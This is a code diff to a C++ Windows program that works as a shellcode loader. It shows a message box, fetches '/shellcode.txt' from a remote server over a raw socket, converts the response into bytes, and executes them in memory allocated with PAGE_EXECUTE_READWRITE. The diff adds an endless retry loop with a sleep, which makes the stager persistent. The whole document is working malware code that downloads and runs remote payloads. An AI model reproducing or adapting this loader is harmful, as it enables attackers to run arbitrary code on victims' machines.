@@ -20,7 +20,7 @@ int messagebox() {
 	return msgboxID;
 }
 
-void fetch(string server, string path) {
+int fetch(string server, string path) {
 	HINSTANCE hInst;
 	WSADATA wsaData;
 	SOCKADDR_IN SockAddr;
@@ -43,15 +43,15 @@ void fetch(string server, string path) {
 	send(sock, get_http.c_str(), strlen(get_http.c_str()), 0);
 
 	// receive and store http response
-	while (recv(sock, buf, 8192, 0)) {
-		response += buf;
-	}
+	if (recv(sock, buf, 8192, 0) < 1)
+		return -1;
+	
+	response += buf;
 
 	// convert shellcode string from http response into byte array
 	string shellcode_str = response.substr(response.find("\r\n\r\n"));
-	for (int i = 0; i < shellcode_str.size() / 4; ++i) {
+	for (int i = 0; i < shellcode_str.size() / 4; ++i)
 		shellcode[i] = strtoul(shellcode_str.substr(i * 4 + 2, 2).c_str(), nullptr, 16);
-	}
 
 	// allocate memory and execute shellcode in memory
 	void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
@@ -67,8 +67,11 @@ int main() {
 	string path = "/shellcode.txt";
 
 	messagebox();
-	fetch(server, path);
-
+	while (true) {
+		if (fetch(server, path) < 1)
+		    continue;
+		Sleep(100000);
+	}
 	return 0;
 
 }
